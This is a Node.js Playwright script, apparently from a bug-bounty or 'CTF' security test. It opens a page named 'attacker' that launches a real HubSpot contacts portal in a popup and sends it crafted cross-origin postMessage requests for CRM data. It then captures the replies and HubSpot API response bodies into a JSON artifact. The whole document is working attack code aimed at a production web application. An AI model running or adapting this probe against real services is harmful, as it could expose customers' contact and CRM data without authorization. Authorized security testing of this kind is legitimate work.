import { chromium } from 'playwright';
import fs from 'node:fs';

const TARGET = 'https://app.hubspot.com/contacts/46962361/';
const browser = await chromium.launch({ headless: true });
const context = await browser.newContext({ viewport: { width: 1280, height: 720 } });
const attacker = await context.newPage();

const targetResponses = [];
context.on('response', async (res) => {
  const u = res.url();
  if (!u.includes('hubspot.com')) return;
  if (!/46962361|content|assist|crm|contact|propert/i.test(u)) return;
  const rec = { status: res.status(), method: res.request().method(), url: u };
  try {
    const ct = (await res.allHeaders())['content-type'] || '';
    if (/json|text/.test(ct)) rec.body = (await res.text()).slice(0, 1200);
  } catch {}
  targetResponses.push(rec);
});

await attacker.setContent('<!doctype html><meta charset="utf-8"><title>scoped probe</title><script>window.__msgs=[];window.addEventListener("message",e=>{window.__msgs.push({origin:e.origin,data:e.data,sourceMatches:e.source===window.__hub})});window.__hub=window.open("https://app.hubspot.com/contacts/46962361/","hubspot_ctf_probe");<\/script>');

const popup = await context.waitForEvent('page', { timeout: 10000 }).catch(() => null);
if (!popup) throw new Error('popup did not open');
await popup.waitForLoadState('domcontentloaded').catch(()=>{});
await popup.waitForTimeout(2500);

const beforeUrl = popup.url();

await attacker.evaluate(() => {
  const hub = window.__hub;
  hub.postMessage({
    type: 'CONTENT_ASSISTANCE_DELEGATED_REQUEST',
    commandId: 'ctf-probe-1',
    featureId: 'crm',
    parameters: { portalId: '46962361' },
    resultCount: 1,
    language: 'en',
    objectId: '46962361',
    applicationId: 'crm',
    basePath: '/crm/v3/objects/contacts',
    maxPollingAttempts: 1,
    pollingInterval: 100
  }, '*');
});

await attacker.waitForTimeout(2500);

await attacker.evaluate(() => {
  window.__hub.postMessage({
    type: 'raw',
    _callbackId: 'ctf-probe-2',
    body: { action: 'getData', portalId: '46962361' }
  }, '*');
});

await attacker.waitForTimeout(2500);

const messages = await attacker.evaluate(() => window.__msgs);
const result = {
  attackerOrigin: await attacker.evaluate(() => location.origin),
  popupBeforeMessages: beforeUrl,
  popupAfterMessages: popup.url(),
  receivedMessages: messages,
  relevantResponses: targetResponses,
};

fs.mkdirSync('security/hubspot-ctf/artifacts', { recursive: true });
fs.writeFileSync('security/hubspot-ctf/artifacts/postmessage-probe.json', JSON.stringify(result, null, 2));
console.log(JSON.stringify(result, null, 2));
await browser.close();
